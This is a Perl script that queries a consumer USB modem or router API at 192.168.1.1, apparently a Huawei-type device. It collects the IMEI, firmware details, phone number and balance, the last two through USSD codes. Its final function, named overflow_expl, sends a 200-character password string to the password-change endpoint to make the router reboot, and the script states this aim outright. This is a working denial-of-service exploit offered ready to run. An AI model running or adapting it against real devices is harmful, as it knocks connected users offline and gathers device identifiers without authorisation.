#!/usr/bin/perl -w

use Term::Cap;
use POSIX;

my $termios = new POSIX::Termios; $termios->getattr;
my $ospeed = $termios->getospeed;
my $t = Tgetent Term::Cap { TERM => undef, OSPEED => $ospeed };
($norm, $bold) = map { $t->Tputs($_,1) } qw/me md/;

sub parse_tag {
	return $2 if ($_[1] =~ /\<($_[0])\>(.*?)\<\/($_[0])\>/sig);
}

sub get_mobile_phone {
  my $q = 30; # Number of tries, also seconds number
  
  $t = `curl  --silent --compressed http://192.168.1.1/api/ussd/send -d '<?xml version="1.0" encoding="UTF-8"?><request><content>*205#</content><codeType>CodeType</codeType></request>'`;
  while ($q != 0){
		my $tmp = `curl  --silent --compressed http://192.168.1.1/api/ussd/get`;
		$q-- if (index($tmp, '\<error\>') != -1);
		if (index($tmp, 'content') != -1) {
			return $2 if ($tmp =~ /\<content\>(.*?)(\d+)\<\/content\>/sig)
	  }
	sleep 1;
	}	
	return "Fail :(";
}

sub get_balance {
  my $q = 30; # Number of tries, also seconds number
  
  $t = `curl  --silent --compressed http://192.168.1.1/api/ussd/send -d '<?xml version="1.0" encoding="UTF-8"?><request><content>*100#</content><codeType>CodeType</codeType></request>'`;
  while ($q != 0){
		my $tmp = `curl  --silent --compressed http://192.168.1.1/api/ussd/get`;
		$q-- if (index($tmp, '\<error\>') != -1);
		if (index($tmp, 'content') != -1) {
			return "$2.$3" if $tmp =~ /\<content\>(.*?)(\d+)\.(\d+)(.*?)\<\/content\>/sig
		}
		sleep 1;
	}	
	return "Fail :(";
}

sub overflow_expl {
  my $v = "";
  for (my $i = 0; $i <= 200; $i++){$v.='E'};

	$null = `curl --silent --compressed http://192.168.1.1/api/user/password -d '<?xml version="1.0" encoding="UTF-8"?><request><Username>admin</Username><CurrentPassword>$v</CurrentPassword><NewPassword>Ooops...</NewPassword></request>'`;
}

my $info = `curl --silent --compressed http://192.168.1.1/api/device/information`;

print "${bold}Device name:${norm} ".parse_tag( "DeviceName", $info)." (".parse_tag( "FullDeviceName", $info).")\t";
print "${bold}IMEI:${norm} ".parse_tag( "Imei", $info)."\n";
print "${bold}Hardware version:${norm} ".parse_tag( "HardwareVersion", $info)."\t";
print "${bold}Software version:${norm} ".parse_tag( "SoftwareVersion", $info)."\n";

print "${bold}Phone number: ${norm}";
print get_mobile_phone."\t";

print "${bold}Balance: ${norm}";
print get_balance."\n";

print "Trying exploiting. If send long string to API, which changes password, router
will reboot...";

overflow_expl;

print "${norm}";
exit;
